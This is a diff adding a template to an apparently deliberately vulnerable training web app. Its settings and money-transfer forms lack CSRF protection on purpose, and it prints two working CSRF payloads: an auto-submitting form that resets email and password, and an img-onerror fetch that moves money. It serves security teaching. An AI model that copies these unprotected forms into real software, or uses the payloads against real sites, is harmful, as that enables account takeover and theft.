@@ -1,0 +1,72 @@
+{% extends "base.html" %}
+
+{% block title %}CSRF - Vulnerable App{% endblock %}
+
+{% block content %}
+<div class="card">
+    <h2>🔄 Cross-Site Request Forgery (CSRF)</h2>
+    <span class="vulnerability-tag">MEDIUM</span>
+    <span class="vulnerability-tag">CWE-352</span>
+    
+    <p>Change account settings. This form has no CSRF protection.</p>
+    
+    <form method="POST" style="margin-top: 1rem;">
+        <label for="email">New Email:</label>
+        <input type="email" id="email" name="email" placeholder="newemail@example.com">
+        
+        <label for="password">New Password:</label>
+        <input type="password" id="password" name="password" placeholder="New password">
+        
+        <button type="submit">Update Settings</button>
+    </form>
+    
+    {% if message %}
+    <div class="success">
+        {{ message }}
+    </div>
+    {% endif %}
+    
+    <div class="hint">
+        <strong>💡 CSRF Attack Example:</strong>
+        <p>Create an HTML file with this content and open it in a browser:</p>
+        <pre>
+&lt;html&gt;
+&lt;body onload="document.getElementById('csrf-form').submit()"&gt;
+  &lt;form id="csrf-form" action="http://localhost:5000/csrf" method="POST"&gt;
+    &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+    &lt;input type="hidden" name="password" value="hacked123"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+        </pre>
+    </div>
+</div>
+
+<div class="card">
+    <h3>💸 Money Transfer (CSRF Vulnerable)</h3>
+    <p>The <code>/transfer</code> endpoint accepts POST requests without CSRF tokens.</p>
+    
+    <form method="POST" action="/transfer" style="margin-top: 1rem;">
+        <label for="amount">Amount:</label>
+        <input type="text" id="amount" name="amount" placeholder="100">
+        
+        <label for="to_account">To Account:</label>
+        <input type="text" id="to_account" name="to_account" placeholder="ACC123456">
+        
+        <button type="submit">Transfer Money</button>
+    </form>
+    
+    <div class="hint">
+        <strong>💡 Auto-submit CSRF for money transfer:</strong>
+        <pre>
+&lt;img src="x" onerror="
+  fetch('http://localhost:5000/transfer', {
+    method: 'POST',
+    body: 'amount=1000&to_account=ATTACKER',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'}
+  })
+"&gt;
+        </pre>
+    </div>
+</div>
+{% endblock %}
